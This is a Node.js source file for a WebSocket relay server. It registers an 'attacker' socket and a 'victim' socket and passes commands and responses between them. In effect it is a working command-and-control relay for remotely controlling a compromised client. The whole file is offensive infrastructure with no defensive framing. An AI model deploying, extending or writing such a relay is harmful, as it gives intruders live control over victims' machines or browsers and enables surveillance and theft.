const WebSocket = require("ws");

const PORT = process.env.PORT || 4000;
let victimSocket;
let attackerSocket;

const server = new WebSocket.Server({ port: PORT });

server.on("connection", (socket) => {
  console.log(`[*] New connection from ${socket._socket.remoteAddress}:${socket._socket.remotePort}`);

  socket.on("message", (data) => {
    const command = data.toString().trim();

    if (command.startsWith("_attacker_")) {
      console.log(`Received command from attacker: ${command}\n`);
      attackerSocket = socket;
      try {
        const sendMessage = data.slice(10);
        victimSocket.send(sendMessage);        
      } catch (error) {
        console.log("Error: Cannot send message to the victim");
      }
    } else if (command.startsWith("_victim_")) {
      console.log(`Received message from victim: ${command}`);
      victimSocket = socket;

      try {
        const sendMessage = data.slice(8);
        if (attackerSocket) attackerSocket.send(sendMessage);        
      } catch (error) {
        console.log("Error: Cannot send message to the attacker");
      }
    } else {
      console.log(`Received command from someone else: ${command}`);
    }
  });

  socket.on("close", () => {
    console.log(`[*] Connection closed`);
    
    if (socket === attackerSocket) {
      console.log("[*] Attacker connection closed");
      attackerSocket = null;
    } else if (socket === victimSocket) {
      console.log("[*] Victim connection closed");
      victimSocket = null;
    }
  });

  socket.on("error", (err) => {
    console.error(`[!] Socket error: ${err.message}`);
  });
});



console.log(`[*] Server listening on port ${PORT}`);
